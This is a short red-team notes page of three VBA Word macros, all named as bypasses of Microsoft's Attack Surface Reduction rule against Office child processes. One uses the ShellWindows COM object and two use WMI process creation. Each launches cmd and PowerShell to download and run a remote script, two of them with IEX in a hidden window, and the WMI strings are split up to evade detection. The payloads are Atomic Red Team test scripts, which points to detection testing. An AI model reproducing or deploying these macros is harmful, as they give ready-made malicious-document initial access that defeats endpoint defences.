# Office Macro - COM

reference: https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3


### WordShellExecute

Word.
explorer->cmd->powershell.

```
Sub ASR_bypass_create_child_process_rule4()
    Const ShellWindows = _
    "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
    Set SW = GetObject("new:" & ShellWindows).Item()
    SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe IWR -uri ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.bat"" -OutFile ""~\Documents\payload.bat"" ; ~\Documents\payload.bat", "C:\Windows\System32", Null, 0
End Sub
```
### WordWmicCreateProcess

Word.
Wmiprvse.exe->cmd->powershell.

```
Sub ASR_bypass_create_child_process_rule5()
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("win" & "mgmts" & ":\\" & strComputer & "\root" & "\cimv2")
    Set objStartup = objWMIService.Get("Win32_" & "Process" & "Startup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root" & "\cimv2" & ":Win32_" & "Process")
    objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')", Null, objConfig, intProcessID
End Sub
```

### WordBenignWMICCreateProcess

Word.
Wmiprvse.exe->cmd->powershell.

This method does not execute mimikatz.

```
Sub ASR_bypass_create_child_process_rule5()
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("win" & "mgmts" & ":\\" & strComputer & "\root" & "\cimv2")
    Set objStartup = objWMIService.Get("Win32_" & "Process" & "Startup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root" & "\cimv2" & ":Win32_" & "Process")
    objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail_benign.ps1')", Null, objConfig, intProcessID
End Sub
```
